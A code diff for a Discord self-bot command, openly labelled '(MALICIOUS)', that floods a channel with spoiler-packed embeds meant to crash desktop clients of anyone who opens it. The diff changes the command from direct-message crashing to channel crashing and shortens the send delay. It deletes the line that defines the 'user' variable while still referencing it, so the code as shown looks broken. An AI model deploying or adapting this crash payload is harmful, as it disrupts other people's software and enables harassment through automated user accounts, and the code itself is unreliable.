@@ -1,9 +1,9 @@
 const { Message, MessageEmbed } = require("discord.js-self")
 const Functions = require("./../../utils/Functions.js")
 module.exports = {
-    name: 'dmcrash',
-    description: '(MALICIOUS) Crashes desktop users when they open the DM',
-    usage: 'dmcrash <Mention> <AmountOfCrashers>',
+    name: 'channelcrash',
+    description: '(MALICIOUS) Crashes desktop users when they open the channel, needs embed perms',
+    usage: 'channelcrash <AmountOfCrashers>',
     /**
      * @param {msg} msg
      */
@@ -25,16 +25,15 @@ module.exports = {
             .addField(Spoiler256, Spoiler1001, true)
             .addField(Spoiler256, Spoiler1001, true)
             .addField(Spoiler256, Spoiler651, true);
-        let user = msg.mentions.users.first()
         if (user !== undefined) {
             if (isNaN(args[1])) {
                 msg.channel.send(ErrorEmbed)
             } else {
                 for (let i = 1; i < parseInt(args[1]); i++) {
-                    await user.send(Spoiler2000, {
+                    await Functions.SilentModeSend(Spoiler2000, msg.channel.id, msg, "Normal", undefined, {
                         embed: CrashEmbed
                     })
-                    await Functions.sleep(2000)
+                    await Functions.sleep(500)
                 }
             }
         } else {
